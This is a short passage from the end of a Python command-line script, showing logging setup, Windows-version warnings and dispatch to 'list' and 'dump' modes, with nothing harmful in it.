        logging.getLogger().setLevel(logging.DEBUG)

    if getattr(args, "named_pipes", False):
        logging.warning("This will work ONLY on Windows >= Vista with PowerShell 2.0+")
    else:
        logging.warning("This will work ONLY on Windows >= Vista")

    if args.mode == "list":
        cmd_list(args)
    elif args.mode == "dump":
        cmd_dump(args)


if __name__ == "__main__":
    main()
